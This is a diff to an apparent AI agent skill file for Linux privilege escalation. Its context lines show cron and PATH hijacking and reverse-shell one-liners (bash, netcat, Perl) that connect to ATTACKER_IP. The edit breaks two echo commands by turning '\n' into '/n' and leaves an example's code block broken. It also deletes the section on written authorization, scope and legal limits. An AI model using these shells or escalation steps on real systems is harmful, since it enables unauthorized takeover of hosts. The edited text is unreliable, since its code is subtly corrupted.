@@ -1,6 +1,6 @@
 ---
 name: linux-privilege-escalation
-description: "Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control."
+description: Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control. Use when the task involves linux privilege escalation.
 risk: offensive
 source: community
 author: zebbern
@@ -360,7 +360,7 @@ ls -la /opt/backup.sh        # Check permissions
 echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh
 
 # If cron references non-existent script in writable PATH
-echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
+echo -e '#!/bin/bash/nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
 chmod +x /home/user/antivirus.sh
 ```
 
@@ -373,7 +373,7 @@ strings /usr/local/bin/suid-binary
 
 # Hijack by creating malicious binary in writable PATH
 export PATH=/tmp:$PATH
-echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
+echo -e '#!/bin/bash/n/bin/bash -p' > /tmp/service
 chmod +x /tmp/service
 /usr/local/bin/suid-binary      # Execute SUID binary
 ```
@@ -399,16 +399,7 @@ gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell
 ## Quick Reference
 
 ### Enumeration Commands Summary
-| Purpose | Command |
-|---------|---------|
-| Kernel version | `uname -a` |
-| Current user | `id` |
-| Sudo rights | `sudo -l` |
-| SUID files | `find / -perm -u=s -type f 2>/dev/null` |
-| Capabilities | `getcap -r / 2>/dev/null` |
-| Cron jobs | `cat /etc/crontab` |
-| Writable dirs | `find / -writable -type d 2>/dev/null` |
-| NFS exports | `cat /etc/exports` |
+> See [references/details.md](references/details.md) for full code examples.
 
 ### Reverse Shell One-Liners
 ```bash
@@ -423,40 +414,7 @@ nc -e /bin/bash ATTACKER_IP 4444
 
 # Perl
 perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
-```
-
-### Key Resources
-- GTFOBins: https://gtfobins.github.io
-- LinPEAS: https://github.com/carlospolop/PEASS-ng
-- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
-
-## Constraints and Guardrails
-
-### Operational Boundaries
-- Verify kernel exploits in test environment before production use
-- Failed kernel exploits may crash the system
-- Document all changes made during privilege escalation
-- Maintain access persistence only as authorized
-
-### Technical Limitations
-- Modern kernels may have exploit mitigations (ASLR, SMEP, SMAP)
-- AppArmor/SELinux may restrict exploitation techniques
-- Container environments limit kernel-level exploits
-- Hardened systems may have restricted sudo configurations
-
-### Legal and Ethical Requirements
-- Written authorization required before testing
-- Stay within defined scope boundaries
-- Report critical findings immediately
-- Do not access data beyond scope requirements
-
-## Examples
-
-### Example 1: Sudo to Root via find
-
-**Scenario**: User has sudo rights for find command
-
-```bash
+> See [references/details.md](references/details.md) for full code examples.
 $ sudo -l
 User user may run the following commands:
     (root) NOPASSWD: /usr/bin/find
